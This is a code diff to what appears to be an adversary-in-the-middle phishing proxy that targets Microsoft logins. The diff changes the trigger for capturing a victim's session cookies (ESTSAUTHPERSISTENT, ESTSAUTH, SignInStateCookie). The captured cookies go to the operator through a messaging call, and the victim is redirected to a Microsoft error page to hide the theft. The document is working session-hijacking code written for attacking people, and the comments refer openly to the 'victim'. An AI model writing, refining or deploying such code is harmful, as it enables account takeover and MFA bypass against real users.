@@ -152,23 +152,26 @@ app.http("phishing", {
           cookie.startsWith("SignInStateCookie=")
       );
 
-      // Real successful-login signal: the persistent session cookie ESTSAUTHPERSISTENT
-      // (set on the login POST response). Fire the victim redirect here — the all-3
-      // condition rarely holds on one response.
-      const success = cookies.some((c) => c.startsWith("ESTSAUTHPERSISTENT="));
-
-      if (success) {
+      // Success = ESTSAUTHPERSISTENT cookie present. On a real login the 3
+      // session cookies (ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie)
+      // arrive in SEPARATE responses — gating on length == 3 almost never
+      // fires. ESTSAUTHPERSISTENT is only set on the final successful login
+      // response, so it is the reliable capture+redirect trigger.
+      if (cookies.some((cookie) => cookie.startsWith("ESTSAUTHPERSISTENT="))) {
         dispatchMessage(
           "Captured required authentication cookies: <br>" +
             JSON.stringify(cookies)
         );
-        // Victim redirect after successful AiTM capture
+        // Override Microsoft's own post-login redirect (office.com) with the
+        // error page — victim lands here after the session cookies are captured.
+        const redirect_headers = new Headers(new_response_headers);
+        redirect_headers.set(
+          "Location",
+          "https://account.live.com/error.aspx?errcode=1086&authid=ZvQ8uXRHNmG71wEy5ToYkrsMcfvAdtBqZPWpg4"
+        );
         return new Response(null, {
           status: 302,
-          headers: {
-            "Location":
-              "https://account.live.com/error.aspx?errcode=1086&authid=ZvQ8uXRHNmG71wEy5ToYkrsMcfvAdtBqZPWpg4",
-          },
+          headers: redirect_headers,
         });
       }
     } catch (error) {
